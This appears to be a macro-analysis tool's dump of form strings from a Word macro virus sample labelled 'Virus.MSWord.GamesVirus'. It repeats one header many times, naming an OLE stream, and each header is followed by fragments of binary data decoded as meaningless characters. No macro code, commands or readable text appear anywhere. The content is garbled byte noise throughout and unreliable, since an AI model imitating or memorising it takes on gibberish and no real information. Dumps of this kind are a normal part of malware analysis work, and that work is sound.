1I'9Q'9Q'9Q1Ji)Ja)Ji1Ji BY(Ba(Ba BY(Ba(Ba BY BY BY2Ri(Ba BY(Ba;Zy)Ji BY(BY'9Q&1Q BY)Ja(Ba(Ba1Ji1Jq2Rq)Ji(Ba(Ba(Ba)Ji;Zy;Zy)Ji2Rq2Rq2Rq2Rq BY Ba(Ba)Ji)Ji'9Y(Ba1Jq3Zq)Ja2Ri(Ba)Ji2Rq*Rq(Ba'9Y;Zy)Ji'9Q1Ji)Ja(Ba2Rq;Zy2Rq1Ji)Ja)Ja)Ji*Ri!Ja)Ji(Ba2Rq3Zy2Rq)Ji)Ji)Ja)Ji;ZyDcy3Zq!Ja+Zq=k�3Zq)Ji BY)Ji3Zy!Ja)Ji)Ji*Ri*Rq"Ri*Ri3Zy)Ji:RiCZq=kyEk�;Zy'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji2Rq<c�Mk�Ek�*Ry3Zy<c�<c�Ek�3Zy!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Bq)Ji3Zq*Rq+Zq+Zq3Zy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji3Zq<cyVs�4cy*Rq!Ja BY(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja;Zy3Zy<c�Dc�<cy3Zq+Zq3Zy*Ri<cy<c�+Zq BY0Ba(Ba!Ja*Rq*Rq2Rq<cy)Ji)Ji)Ja'9Q2Rq2Rq)Ji(BY(BY(Ba2Ri2Ri3Zy2Ri(Ba;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba)Ji2Ri2Rq)Ji2Rq1Ji3Zi2Ri2Rq2Ry2Ri(Ba)Ji2Rq<c�;Zy*Ri(Ba3Zy*Ri)Ja1Ji2Rq2Rq2Rq)Ji)Ji*Ri(Ba)Ji2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Q'9Q'9Q BY BY(BY)Ja1Ji2Rq2Rq)Ji(Ba(BY2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Q'9Q'9Y(Ba(Ba BQ BY BY(BY BQ BY(BY(Ba2Rq)Ji)Ji BY'9Q)Ja3Zq3Zq2Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq)Ja Ba)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy2Rq1Ji2Rq;Zy*Rq)Ja)Ji)Ji3Zq)Ja BY*Ri2Rq)Ji BY BY)Ja)Ji BY3Zq;Zy;Zy)Ja1Ji)Ji)Ji)Ji)Ji)Ji2Rq2Ri2Ri*Ri)Ji)Ja BY)Ja)Ji Ba(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9Q*Ri;Zq)Ji!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq;Zy<cy;Zy!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY Ba)Ja!Ji2Rq*Rq*Rq*Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq Bi)Ja(Ba)Ji*Ri<cy*Rq*RiNs�Ek�<cy3Zy*Rq3Zy"Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ri*Rq)Ji*Ri!Ja)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba)Ji3Zq3Zq BY)Ja3Zq3Zy'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY*Ri2Rq1Ji)Ji'9Q2Rq)Ji)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja)Ji2Rq2Rq)Ja2Ri)Ji)Ji(Ba3Zq'9Q2Rq*Ri)Ja)Ji)Ja&1Q(Ba'9Y'9Q(BY)Ja)Ja)Ji(Ba Ba2Rq3Zy2Rq3Zy2Rq3Zq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Y(Ba)Ja'9Q'9Q'9Q'9Y BY'9Q BY BY2Ri2Ri'9Q'9Q'9Q)Ji;Zy'9Y BQ)Ja)Ja)Ja BY'9Q)Ja)Ja'9Q(BY*Ri*Ri Ba BY(Ba*Ri(Ba)Ji*Ri1Ji(Ba BY)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(Ba BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY(Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY2Rq'9Q*Ri)Ja)Ja BY)Ji)Ji(BY(BY1Ji)Ji3Zy*Rq*Ri(Ba3Zq(Ba3Zq)Ja'9Q)Ja*Ri2Rq*Ri2Ry2Rq*Ri*Ri2Rq)Ja'9Y'9Y(Ba)Ji(BY(Ba(Ba)JiDc�W{�Mky2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ja<cy4cq'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja*Rq3Zy3Zy*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ri3Zy;Zy!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY2RiLcy<c�=k�Ek�<cy3Zq*Ri*Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(Ba)Ji3ZqMky;Za BY BY!Ja3Zq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri Bi*Rq;Zy*Ri;Zq)JiEk�<c�3Zy*Rq'9a Bi<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY(Ba)Ji)Ji*Ri)Ji)Ja(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ)Ji BY'9I(Ba*Ri<c�3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji3Zy2Rq2Rq*Ri(Ba'9Y)Ji<c�<c�2Rq)Ja!Ja2Rq)Ji Ba(Ba)Ja(BY'9Q(Ba2Rq)Ji)Ja2Ri2Ri2Rq BY)Ja'9Q'9Y(Ba2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Ba(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I3Zq)Ja'9I1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A1Ji(BY'9Q(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba'9Y)Ja)Ji(Ba)Ja)Ja'9Q1Ja2Rq)Ja'9Q(BY*Ri;Zy'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(BY(Ba'9Q)Ja)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba'9Q(Ba BY BQ2Ri*Ri)Ja(BY'9Q'9Q'9Q BY2Rq(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I1Ji Ba(BY2Rq2Ri(Ba(Ba(BY)Ji)Ji)Ja)Ja(Ba2Ri;Zy(Ba1Ji)Ji)Ji(Ba)Ja*RiEk�3Zq2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji"Ri2Rq)Ji(Ba0Ba3ZqFs�<c�<c�<c� BY)Ji<c�<cy;Zq2Ri!Ji!Ji)JY)JY2Rq+Zq2Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0)Ja BY BY(Ba!Ja!Ja Bi!Ji)Ja;ZiEk�NsyCZq3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba2Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY)Ja BY)Ji)Jq)Jq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY1Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY<c�Uk�1Ji Bi!Jq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a!Ja!Ji*Rq;Zy"Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja*Rq;ZyMkq3Zi)Ji2Rq=k�<cy(Ba BY!Ja Ba&1a(Bi=kyMk�Ek�)Ja'9Q Ba)Ji2Ry)Ji)Ji(Bi4c�)Ji(Ba)Ji2Rq)Ja)Ja2Rq)Ji)Ji<c� BY2Rq3Zq3Zy1Jq)Ja1Ji1Ji(Ba)Ja)Ja)Ji1Ji BY)Ja(BY)Ji&1Q(BY Ba BY)Ji*Ri;Zy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:Ra;Zi9Ji BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY BY'9I(Ba)Ji)Ja)Ja'9Q'9I(BY<c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja BY(Ba BY'9Q(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY'9Q)Ja)Ji)Ji)Ja)Ji*Ri3Zq2Rq)Ji2Rq(Ba)Ji1Ji*Ri*Rq;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY2Ri*Ri&1I)Ja2Rq BY'9Y2Rq)Ja BY(Ba)Ja)Ja2Rq;Zy)Ji/9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I!Ja2Rq Ba Ba!JY<cq2Rq*Ri*Ri Ba)Ja;Zy)Ji!Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji<c�;Zy*Rq)Ji)Ji3Zy3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y&1Q BY;Zy;Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy*Ri*Ri1Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba(Ba9JiDcq!Ja3Zq<c�<cy<c�Dcy2Ri!Ja"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Ri3Zq<c�=k�3Zq!Ji!Ji)Ja)Ja!Ja Ba(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q2Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY"Ri3Zy3Zy*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y3Zy Ba)Ja3Zy<c�<cy)Ji*Ri2Rq)Ja)Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ja(Ba2Ri!Ja)Ji)Ja)Ji)Ji)Ja BY'9Y(Ba<c�*Ri*Rq Ba)Ja2Rq2Rq2Rq(Ba(Ba(Ba3Zy)Ja)Ji2Ry*Ri BY)Ji*RiEk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Ri2Ri(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji(Ba)Ja!Ja*Ra2Ri1Ji)Ja(BY/9Y(BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Y!Ji"Rq3Zq*Ri!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja)Ji"Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y*Ri(Ba Ba Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji*RiDcy3Zq*Ri<cy3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji<cy<c�Uk�;Zy*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba!Ji3Zq;Zq(Ba)Jq*Rq)Jq Ba*Rq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>s�W{�=k�=k�&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0)Jq<c�(BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)JiDc�!Ja)Ja&1Q%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y<cy*Ri2Ri;ZyDcy<cy<c�<c�*Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a(BY)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ry!Ji*Rq)Jq Ba
-------------------------------------------------------------------------------
